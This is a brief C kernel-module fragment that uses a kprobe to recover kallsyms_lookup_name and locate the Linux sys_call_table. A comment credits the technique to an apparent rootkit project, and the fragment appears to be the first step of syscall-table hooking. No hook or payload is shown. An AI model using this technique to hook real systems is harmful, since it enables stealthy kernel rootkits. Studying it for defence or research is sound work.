#include <linux/kprobes.h>


static unsigned long* sys_call_table;



/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/kprobes.h#L75
 * struct kprobe { const char *symbol_name;	// Allow user to indicate symbol name of the probe point }
 */
static struct kprobe kp = {
            .symbol_name = "kallsyms_lookup_name"
};


unsigned long* hook_syscall_table(void){
	/** newer kernels no longer provided the "kallsyms_lookup_name" used to hook 
	*  syscall table in prev code.
	*  Newer kernels can still easily have syscall table found and hooked though, and the
	*  technique below was taken from one such instance found here: https://github.com/reveng007/reveng_rtkit 
	**/ 
	typedef unsigned long(*kallsyms_lookup_name_t)(const char* name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);

	sys_call_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	return sys_call_table;
}

